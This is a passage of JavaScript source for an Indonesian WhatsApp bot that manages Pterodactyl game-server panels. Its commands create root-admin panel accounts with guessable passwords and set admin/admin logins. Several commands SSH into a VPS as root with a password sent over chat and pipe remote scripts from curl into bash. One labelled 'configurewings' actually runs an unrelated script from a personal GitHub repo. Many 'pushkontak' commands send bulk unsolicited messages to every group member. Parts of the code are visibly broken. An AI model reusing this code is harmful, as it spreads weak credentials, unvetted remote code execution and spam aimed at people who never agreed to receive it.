"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "adminpanel": {
if (!isCreator) return
let t = qtext.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
.${command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "admin"
let egg = global.eggs
let loc = global.loca
let memo = "1048"
let cpu = "200"
let disk = "5091"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/2ae4161df4858b41d7acf.jpg" 
if (!u) return
let d = (await conn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"root_admin": true,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + eggs, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey
}
})
ctf = `\`Chat privat data panel\`

 ╭─ ADMIN PANEL 」
 │• 🖥 _USERNAME_ : ${monospa(user.username)}
 │• 🛡 _PASSWORD_ : ${monospa(password)}
 │• 🔗 _LOGIN_ : ××××××××
 ╰───── `
conn.sendButtonImage(u,  [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "Register",
      url: domain,
      merchant_url: domain
   })
}], m, {
   image: 'https://telegra.ph/file/50eefda72731d2b2336fb.jpg',
   body: ctf,
   footer: `📑 Note : _Jangan sampai hilang ataupun terhapus!!._`
});
// conn.sendMessage(u, { text: explist }, {quoted: VerifQuote })
let data2 = await f2.json();
//console.log(data.attributes.startup)
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey,
},
"body": JSON.stringify({
"name": name,
"description": `Expired ` + getNextMonthDate(),
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "listsrv": {
if (!isCreator) return reply(mess.owner)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + c_apikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await conn.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
case "listusr": {
if (!isCreator) return reply(mess.owner)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await conn.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
        case "delsrv": {
if (!isCreator) return 
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
m.reply('*SUCCESSFULLY DELETE THE SERVER*')
}
        break
        case "delusr": {
if (!isCreator) return 
let usr = args[0]
if (!usr) return reply('Hmm ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
m.reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
case'startwings':{
if (!isCreator) return 
let t = qtext.split(',');
if (t.length < 3) return m.reply(`*Format salah!*\nPenggunaan: ${prefix}startwings ipvps,password,domainpanel,domainnode,apinode`)
let ipvps = t[0];
let passwd = t[1];
let subdomain = t[2];
let domainnode =t[3];
let apinode =t[4];
const connSettings = {
    host: ipvps,
    port: '22',
    username: 'root',
    password: passwd
};

const command = 'bash <(curl -s https://pterodactyl-installer.se)';

const conn = new Client();
conn.on('ready', () => {
          m.reply('*PROSES PENGINSTALLAN NODE SEDANG BERLANGSUNG MOHON TUNGGU 5-10MENIT*')
    conn.exec(command, (err, stream) => {
        if (err) throw err;
        stream.on('close', (code, signal) => {
            console.log('Stream closed with code ' + code + ' and signal ' + signal);
            conn.end();
        }).on('data', (data) => {
          if (data.toString().includes('Input')) {
            stream.write('1\n');
          }

          if (data.toString().includes('Input')) {
            stream.write('y\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('y\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('y\n');
          }
          if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
          }
          if (data.toString().includes('Input')) {
            stream.write('y\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('admin\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('admin\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('y\n');
          }
          if (data.toString().includes('Input')) {
            stream.write(`${domainnode}\n`);
          }
          if (data.toString().includes('Input')) {
            stream.write('y\n');
          }
          if (data.toString().includes(Input)) {
            stream.write('admin@gmail.com\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('y\n');
          }
          if (data.toString().includes('Input')) {
            stream.write(`${apinode}\n`);
          }   
          if (data.toString().includes('Input')) {
            stream.write('systemctl start wings\n');
          }                 
          console.log('STDOUT: ' + data);
        }).stderr.on('data', (data) => {
          console.log('STDERR: ' + data);
        });
    });
}).connect(connSettings);
await new Promise(resolve => setTimeout(resolve, 9000));
m.reply(`SUCCES INSTALL WINGS`)
}
break

case'installpanel':{
if (!isCreator) return reply("_Harus user premium_")
let t = qtext.split(',');
if (t.length < 3) return m.reply(`*Format salah!*\nPenggunaan: ${prefix}installpanel ipvps,password,domain`)
let ipvps = t[0];
let passwd = t[1];
let subdomain = t[2];
const connSettings = {
    host: ipvps,
    port: '22',
    username: 'root',
    password: passwd
};

const command = 'bash <(curl -s https://pterodactyl-installer.se)';

const conn = new Client();
conn.on('ready', () => {
          m.reply('*PROSES PENGINSTALLAN PANEL SEDANG BERLANGSUNG MOHON TUNGGU 5-10MENIT*')
    conn.exec(command, (err, stream) => {
        if (err) throw err;
        stream.on('close', (code, signal) => {
            console.log('Stream closed with code ' + code + ' and signal ' + signal);
            conn.end();
        }).on('data', (data) => {
          if (data.toString().includes('Input')) {
            stream.write('0\n');
          }

          if (data.toString().includes('Input')) {
            stream.write('\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('admin\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('Asia/Jakarta\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('admin\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('admin\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('admin\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('admin\n');
          }
          if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
          }
          if (data.toString().includes('Input')) {
            stream.write('y\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('y\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('y\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('y\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('yes\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('A\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('A\n');
          }
          if (data.toString().includes('Input')) {
            stream.write('y\n');
          }  
          if (data.toString().includes('Input')) {
            stream.write('A\n');
          }        
          console.log('STDOUT: ' + data);
        }).stderr.on('data', (data) => {
          console.log('STDERR: ' + data);
        });
    });
}).connect(connSettings);
await new Promise(resolve => setTimeout(resolve, 90000));
m.reply(`*DATA PANEL ANDA*\n\n*USERNAME:* admin\n*PASSWORD:* admin\n*LOGIN:* ${subdomain}\nNote: harus Install Wings Ketik .install-wings\nNote: *HARAP TUNGGU 1-5MENIT BIAR WEB BISA DI BUKA`)
}
break
case 'uninstallpanel': {
    if (!isCreator) return reply("_Harus user premium_")
    let t = qtext.split(',');
    if (t.length < 2) return reply(`*Format salah!*\nPenggunaan: ${prefix}uninstallpanel ipvps,password`);
    let ipvps = t[0].trim();
    let passwd = t[1].trim();
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = 'bash <(curl -s https://pterodactyl-installer.se)';

    const conn = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi
    conn.on('ready', () => {
        reply('*PROSES UNINSTALL PANEL SEDANG BERLANGSUNG, MOHON TUNGGU 20 DETIK*');
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
            }).on('data', (data) => {
                console.log('STDOUT: ' + data);
                if (data.toString().includes('Input')) {
                    if (data.toString().includes('6')) {
                        stream.write('6\n');
                    } else if (data.toString().includes('y/n')) {
                        stream.write('y\n');
                    } else {
                        stream.write('\n');
                    }
                }
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).connect(connSettings);
    await new Promise(resolve => setTimeout(resolve, 20000));
    if (isSuccess) {
            reply('`SUKSES UNINSTALL PANEL ANDA, SILAHKAN CEK`');
        }
   }
    break;
case 'startwings': case 'configurewings': {
    if (!isCreator) return reply("_Harus user premium_")
    
    let t = qtext.split(',');
    if (t.length < 2) return reply(`*Format salah!*\nPenggunaan: ${cmd} ipvps,password,token (token configuration)`)
    
    let ipvps = t[0];
    let passwd = t[1];
    let token = t[2];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl https://raw.githubusercontent.com/vallzprivate/theme/main/install.sh)'
    const conn = new Client();
 
    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        reply('*PROSES CONFIGURE WINGS*')
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
reply('SUCCES START WINGS DI PANEL ANDA COBA CEK PASTI IJO😁');
                conn.end();
            }).on('data', (data) => {
            stream.write('RafatharCode\n');
                stream.write('3\n');
                stream.write(`${token}\n`)
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   }

break

case "pushkontak":{
if (!isCreator) return reply('_khusus owner_')
if (!isGroup) return reply('`Khusus` group')
if (!qtext) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)

const groupMetadata = isGc? await conn.groupMetadata(from).catch(e => {}) : ""
const groupOwner = isGc? groupMetadata.owner : ""
const participantts = isGc? await groupMetadata.participants : ""
const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
const mess = `Pesan Push Kontak Sedang Di Kirim ke ${halsss.length} Orang\nSelama ${halsss.length * 7} detik\n\n harap untuk tidak melakukan chat saat pushkontak sedang berlangsung!`
await conn.sendMessage(from, {text:mess},{quoted:m})
await conn.sendMessage(owner, {text:mess},{quoted:m})
global.tekspushkonv2 = text

if (isContacts) return
for (let men of halsss) {
contacts.push(men)
fs.writeFileSync('./database/contact/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await conn.downloadAndSaveMediaMessage(quoted)
mem = await global.telegraPH(media)
await conn.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
await delay(7000)
} else {
var contact = generateWAMessageFromContent(men, proto.Message.fromObject({
"contactMessage": {
"displayName": `Push Kontak`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Push Kontak kym\nFN:${pushname}\nitem1.TITLE:Kontak ${pushname}\nURL:kymchat.chatango.com\nitem496.TEL;waid=${nomore}:${pushname}\nitem496.X-ABLabel:Save nomor saya\nX-WA-BIZ-DESCRIPTION:Developer\nEND:VCARD`,
}
}), { userJid: men})
conn.relayMessage(men, contact.message, { messageId: contact.key.id })
await delay(7000)
conn.sendMessage(men, {text: text})
await delay(7000)
}
}
const mess2 = `Sekarang Tinggal Ketik *.savekontak* Nanti Muncul *File* Pencet Aja Terus Impor pakai apk kontak bawaan ya!`
await conn.sendMessage(from, {text:mess2},{quoted:m})
await conn.sendMessage(owner, {text:mess2},{quoted:m})
}
break
            case "pk3":
        case 'pushkontak3': {
            if (!qtext) return reply(`Example ${prefix + command} Hi Semuanya`)
if (!isCreator) return reply('_khusus owner_')
            let get = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
            let count = get.length;
            let sentCount = 0;
            reply('*Wait A Moment.*');
            for (let i = 0; i < get.length; i++) {
              setTimeout(function() {
                conn.sendMessage(get[i], {image: {url: global.menu}, caption: text });
                count--;
                sentCount++;
                if (count === 0) {
                  reply(`*📜 Sukses Mengirim Pesan Berjumlah: ${sentCount}*`);
                }
              }, i * global.waktu); // delay setiap pengiriman selama 1 detik
            }
            }
            break
            
             case "pk2":
        case 'pushkontak2': {
            if (!qtext) return reply(`Example ${prefix}${command} idgc|Hi Semuanya`)
if (!isCreator) return reply('_khusus owner_')
let idgc = qtext.split("|")[0]
let pesan = qtext.split("|")[1]
            let metaDATA = await conn.groupMetadata(idgc).catch((e) => m.reply(e))
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
            let count = getDATA.length;
            let sentCount = 0;
            reply('*Wait A Moment.*');
            for (let i = 0; i < getDATA.length; i++) {
              setTimeout(function() {
                conn.sendMessage(getDATA[i], { text: pesan });
                count--;
                sentCount++;
                if (count === 0) {
                  reply(`*📜 Sukses Mengirim Pesan Berjumlah: ${sentCount}*`);
                }
              }, i * global.waktu); // delay setiap pengiriman selama 1 detik
            }
            }
            break
            
            case "pk4":
        case 'pushkontak4': {
            if (!qtext) return reply(`Example ${prefix}${command} idgc|Hi Semuanya`)
if (!isCreator) return reply('_khusus owner_')
let idgc = qtext.split("|")[0]
let pesan = qtext.split("|")[1]
            let metaDATA = await conn.groupMetadata(idgc).catch((e) => m.reply(e))
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
            let count = getDATA.length;
            let sentCount = 0;
            reply('*Wait A Moment.*');
            for (let i = 0; i < getDATA.length; i++) {
              setTimeout(function() {
                conn.sendMessage(getDATA[i], {image: {url: global.pushphoto}, caption: pesan });
                count--;
                sentCount++;
                if (count === 0) {
                  reply(`*📜 Sukses Mengirim Pesan Berjumlah: ${sentCount}*`);
                }
              }, i * global.waktu); // delay setiap pengiriman selama 1 detik
            }
            }
            break
            case 'pk5':
                case 'pushkontak5': {
            if (!qtext) return reply(`Example _${prefix}${command} idgc|Hi|link_\n Contoh: .pushkontak5 120363267xxxxxxxxx@g.us|pesan|https://google.com`)
if (!isCreator) return reply('_khusus owner_')
let idgc = qtext.split("|")[0]
let pesan = qtext.split("|")[1]
let link = qtext.split("|")[2]
            let metaDATA = await conn.groupMetadata(idgc).catch((e) => m.reply(e))
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
            let count = getDATA.length;
            let sentCount = 0;
            reply('*Wait A Moment.*');
            for (let i = 0; i < getDATA.length; i++) {
              setTimeout(function() {
conn.sendButtonImage(getDATA[i],  [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "Tap Here",
      url: link,
      merchant_url: link
   })
}], m, {
   image: global.pushphoto,
   body: pesan,
   footer: `Lyosh`
});
                count--;
                sentCount++;
                if (count === 0) {
                  reply(`*📜 Sukses Mengirim Pesan Berjumlah: ${sentCount}*`);
                }
              }, i * global.waktu); // delay setiap pengiriman selama 1 detik
            }
            }
            break
                        case 'pk6':
                case 'pushkontak6': {
            if (!qtext) return reply(`Example _${prefix}${command} idgc|Hi|cmd fitur_ \nContoh: .pushkontak6 120363267xxxxxxxxx@g.us|pesan|.menu`)
if (!isCreator) return reply('_khusus owner_')
let idgc = qtext.split("|")[0]
let pesan = qtext.split("|")[1]
let cmd = qtext.split("|")[2]
            let metaDATA = await conn.groupMetadata(idgc).catch((e) => m.reply(e))
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
            let count = getDATA.length;
            let sentCount = 0;
            reply('*Wait A Moment.*');
            for (let i = 0; i < getDATA.length; i++) {
              setTimeout(function() {
conn.sendButtonImage(getDATA[i],  [{
   name: "quick_reply",
   buttonParamsJson: JSON.stringify({
      display_text: "Tap Here",
      id: cmd
   }),
}], m, {
   image: global.pushphoto,
   body: pesan,
   footer: `Lyosh`
});
                count--;
                sentCount++;
                if (count === 0) {
                  reply(`*📜 Sukses Mengirim Pesan Berjumlah: ${sentCount}*`);
                }
              }, i * global.waktu); // delay setiap pengiriman selama 1 detik
            }
            }
            break
                case 'pk7':
                case 'pushkontak7': {
            if (!qtext) return reply(`Example _${prefix}${command} idgc|Hi|pesan copy_ \nContoh: .pushkontak7 120363267xxxxxxxxx@g.us|pesan|🐣hallo`)
if (!isCreator) return reply('_khusus owner_')
let idgc = qtext.split("|")[0]
let pesan = qtext.split("|")[1]
let salinan = qtext.split("|")[2]
            let metaDATA = await conn.groupMetadata(idgc).catch((e) => m.reply(e))
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
            let count = getDATA.length;
            let sentCount = 0;
            reply('*Wait A Moment.*');
            for (let i = 0; i < getDATA.length; i++) {
              setTimeout(function() {
conn.sendButtonImage(getDATA[i],  [{
   name: "cta_copy",
   buttonParamsJson: JSON.stringify({
      display_text: "Copy Text",
      copy_code: salinan
      })
}], m, {
   image: global.pushphoto,
   body: pesan,
   footer: `Lyosh`
});
                count--;
                sentCount++;
                if (count === 0) {
                  reply(`*📜 Sukses Mengirim Pesan Berjumlah: ${sentCount}*`);
                }
              }, i * global.waktu); // delay setiap pengiriman selama 1 detik
            }
            }
            break
                  case 'pk8':
                case 'pushkontak8': {
            if (!qtext) return reply(`Example _${prefix}${command} idgc|Hi|nomor_ \nContoh: .pushkontak8 120363267xxxxxxxxx@g.us|pesan|628989792227`)
if (!isCreator) return reply('_khusus owner_')
let idgc = qtext.split("|")[0]
let pesan = qtext.split("|")[1]
let numberr = qtext.split("|")[2]
            let metaDATA = await conn.groupMetadata(idgc).catch((e) => m.reply(e))
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
            let count = getDATA.length;
            let sentCount = 0;
            reply('*Wait A Moment.*');
            for (let i = 0; i < getDATA.length; i++) {
              setTimeout(function() {
conn.sendButtonImage(getDATA[i],  [{
   name: "cta_call",
   buttonParamsJson: JSON.stringify({
      display_text: "Panggil",
      phone_number: numberr
   })
}], m, {
   image: global.pushphoto,
   body: pesan,
   footer: `Lyosh`
});
                count--;
                sentCount++;
                if (count === 0) {
                  reply(`*📜 Sukses Mengirim Pesan Berjumlah: ${sentCount}*`);
                }
              }, i * global.waktu); // delay setiap pengiriman selama 1 detik
            }
            }
            break
                  case 'pk9':
                case 'pushkontak9': {
            if (!qtext) return reply(`Example _${prefix}${command} idgc|Hi|cmd1|cmd2_ \nContoh: .pushkontak9 120363267xxxxxxxxx@g.us|pesan|.menu|.owner`)
if (!isCreator) return reply('_khusus owner_')
let idgc = qtext.split("|")[0]
let pesan = qtext.split("|")[1]
let cmd1 = qtext.split("|")[2]
let cmd2 = qtext.split("|")[3]
            let metaDATA = await conn.groupMetadata(idgc).catch((e) => m.reply(e))
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
            let count = getDATA.length;
            let sentCount = 0;
            reply('*Wait A Moment.*');
            for (let i = 0; i < getDATA.length; i++) {
              setTimeout(function() {
conn.sendButtonImage(getDATA[i],  [{
   name: "single_select",
   buttonParamsJson: JSON.stringify({
      title: "Tap!",
      sections: [{
         rows: [{
            title: cmd1,
            description: ``,
            id: cmd1
         }, {
            title: cmd2,
            description: ``,
            id: cmd2
         }]
      }]
   })
}], m, {
   image: global.pushphoto,
   body: pesan,
   footer: `Lyosh`
});
                count--;
                sentCount++;
                if (count === 0) {
                  reply(`*📜 Sukses Mengirim Pesan Berjumlah: ${sentCount}*`);
                }
              }, i * global.waktu); // delay setiap pengiriman selama 1 detik
            }
            }
            break            
             case "pk10":
        case 'pushkontak10': {
            if (!qtext) return reply(`Example _${prefix + command} link video pesan_\n Contoh: .pushkontak10 https://telegra.ph/file/2d25eb0db37e8e88fdef6.mp4 pesan\n\nminusnya: nggak bisa spasi pesan 😌`)
if (!isCreator) return reply('_khusus owner_')
let pesan = qtext.split("|")[1]
            let get = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
            let count = get.length;
            let sentCount = 0;
            reply('*Wait A Moment.*');
            for (let i = 0; i < get.length; i++) {
              setTimeout(function() {
                conn.sendMessage(get[i], {video: {url: global.pushviddeo}, caption: pesan });
                count--;
                sentCount++;
                if (count === 0) {
                  reply(`*📜 Sukses Mengirim Pesan Berjumlah: ${sentCount}*`);
                }
              }, i * global.waktu); // delay setiap pengiriman selama 1 detik
            }
            }
            break           
            case "pk11":
        case 'pushkontak11': {
            if (!qtext) return reply(`Example ${prefix}${command} idgc|pesann`)
if (!isCreator) return reply('_khusus owner_')
let idgc = qtext.split("|")[0]
let pesan = qtext.split("|")[1]
            let metaDATA = await conn.groupMetadata(idgc).catch((e) => m.reply(e))
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
            let count = getDATA.length;
            let sentCount = 0;
            reply('*Wait A Moment.*');
            for (let i = 0; i < getDATA.length; i++) {
              setTimeout(function() {
                conn.sendMessage(getDATA[i], {video: {url: global.pushviddeo}, caption: pesan });
                count--;
                sentCount++;
                if (count === 0) {
                  reply(`*📜 Sukses Mengirim Pesan Berjumlah: ${sentCount}*`);
                }
              }, i * global.waktu); // delay setiap pengiriman selama 1 detik
            }
            }
            break
                case 'pk12':
                case 'pushkontak12': {
            if (!qtext) return reply(`Example _${prefix}${command} idgc|pesan|linkbutton_\n Contoh: .pushkontak12 120363267xxxxxxxxx@g.us|pesan|https://google.com`)
if (!isCreator) return reply('_khusus owner_')
let idgc = qtext.split("|")[0]
let pesan = qtext.split("|")[1]
let link = qtext.split("|")[2]
            let metaDATA = await conn.groupMetadata(idgc).catch((e) => m.reply(e))
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
            let count = getDATA.length;
            let sentCount = 0;
            reply('*Wait A Moment.*');
            for (let i = 0; i < getDATA.length; i++) {
              setTimeout(function() {
conn.sendButtonVideo(getDATA[i],  [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "Tap Here",
      url: link,
      merchant_url: link
   })
}], m, {
   video: global.pushviddeo,
   body: pesan,
   footer: `Lyosh`
});
                count--;
                sentCount++;
                if (count === 0) {
                  reply(`*📜 Sukses Mengirim Pesan Berjumlah: ${sentCount}*`);
                }
              }, i * global.waktu); // delay setiap pengiriman selama 1 detik
            }
            }
            break        
case 'pk13':
                case 'pushkontak13': {
            if (!qtext) return reply(`Example _${prefix}${command} idgc|Hi|cmd fitur_ \nContoh: .pushkontak13 120363267xxxxxxxxx@g.us|pesan|.menu`)
if (!isCreator) return reply('_khusus owner_')
let idgc = qtext.split("|")[0]
let pesan = qtext.split("|")[1]
let cmd = qtext.split("|")[2]
            let metaDATA = await conn.groupMetadata(idgc).catch((e) => m.reply(e))
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
            let count = getDATA.length;
            let sentCount = 0;
            reply('*Wait A Moment.*');
            for (let i = 0; i < getDATA.length; i++) {
              setTimeout(function() {
conn.sendButtonVideo(getDATA[i],  [{
   name: "quick_reply",
   buttonParamsJson: JSON.stringify({
      display_text: "Tap Here",
      id: cmd
   }),
}], m, {
   video: global.pushviddeo,
   body: pesan,
   footer: `Lyosh`
});
                count--;
                sentCount++;
                if (count === 0) {
                  reply(`*📜 Sukses Mengirim Pesan Berjumlah: ${sentCount}*`);
                }
              }, i * global.waktu); // delay setiap pengiriman selama 1 detik
            }
            }
            break
            case 'pk14':
                case 'pushkontak14': {
            if (!qtext) return reply(`Example _${prefix}${command} idgc|Hi|pesan copy_ \nContoh: .pushkontak14 120363267xxxxxxxxx@g.us|pesan|🐣hallo`)
if (!isCreator) return reply('_khusus owner_')
let idgc = qtext.split("|")[0]
let pesan = qtext.split("|")[1]
let salinan = qtext.split("|")[2]
            let metaDATA = await conn.groupMetadata(idgc).catch((e) => m.reply(e))
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
            let count = getDATA.length;
            let sentCount = 0;
            reply('*Wait A Moment.*');
            for (let i = 0; i < getDATA.length; i++) {
              setTimeout(function() {
conn.sendButtonVideo(getDATA[i],  [{
   name: "cta_copy",
   buttonParamsJson: JSON.stringify({
      display_text: "Copy Text",
      copy_code: salinan
      })
}], m, {
   video: global.pushviddeo,
   body: pesan,
   footer: `Lyosh`
});
                count--;
                sentCount++;
                if (count === 0) {
                  reply(`*📜 Sukses Mengirim Pesan Berjumlah: ${sentCount}*`);
                }
              }, i * global.waktu); // delay setiap pengiriman selama 1 detik
            }
            }
            break
            case 'pk15':
             case 'pushkontak15': {
            if (!qtext) return reply(`Example _${prefix}${command} idgc|Hi|nomor_ \nContoh: .pushkontak15 120363267xxxxxxxxx@g.us|pesan|628989792227`)
if (!isCreator) return reply('_khusus owner_')
let idgc = qtext.split("|")[0]
let pesan = qtext.split("|")[1]
let numberr = qtext.split("|")[2]
            let metaDATA = await conn.groupMetadata(idgc).catch((e) => m.reply(e))
let getDATA = await metaDATA.participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
            let count = getDATA.length;
            let sentCount = 0;
            reply('*Wait A Moment.*');
            for (let i = 0; i < getDATA.length; i++) {
              setTimeout(function() {
